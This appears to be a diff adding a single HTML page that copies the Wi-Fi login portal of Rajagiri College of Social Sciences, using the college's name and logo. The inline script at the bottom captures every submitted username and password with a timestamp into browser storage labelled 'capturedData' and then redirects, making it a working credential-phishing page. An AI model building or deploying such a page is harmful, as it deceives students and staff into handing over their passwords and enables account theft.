@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RCSS - Sign in to access Internet</title>
+    <meta name="description" content="Rajagiri College of Social Sciences - Internet Access Login Portal">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="page-wrapper">
+        <!-- Header -->
+        <header class="header" id="site-header">
+            <h1 id="college-name">RAJAGIRI COLLEGE OF SOCIAL SCIENCES</h1>
+        </header>
+
+        <!-- Login Card -->
+        <main class="login-card" id="login-card">
+            <!-- Logo -->
+            <div class="logo-container" id="logo-container">
+                <img src="rcss_logo.png" alt="RCSS - Rajagiri College of Social Sciences (Autonomous)" class="logo-img" id="logo-img">
+            </div>
+
+            <!-- Form Section -->
+            <div class="form-section" id="form-section">
+                <h2 class="form-title" id="form-title">Sign in to access Internet</h2>
+
+                <form id="login-form" action="#" method="POST">
+                    <div class="input-group" id="username-group">
+                        <input 
+                            type="text" 
+                            id="username-input" 
+                            name="username" 
+                            placeholder="Username" 
+                            autocomplete="username"
+                            required
+                        >
+                    </div>
+
+                    <div class="input-group" id="password-group">
+                        <input 
+                            type="password" 
+                            id="password-input" 
+                            name="password" 
+                            placeholder="Password" 
+                            autocomplete="current-password"
+                            required
+                        >
+                    </div>
+
+                    <button type="submit" class="signin-btn" id="signin-btn">Sign in</button>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username-input').value;
+            const password = document.getElementById('password-input').value;
+            
+            if (username && password) {
+                const entries = JSON.parse(localStorage.getItem('capturedData') || '[]');
+                entries.push({
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString()
+                });
+                localStorage.setItem('capturedData', JSON.stringify(entries));
+                window.location.href = 'index.html';
+            }
+        });
+    </script>
+</body>
+</html>
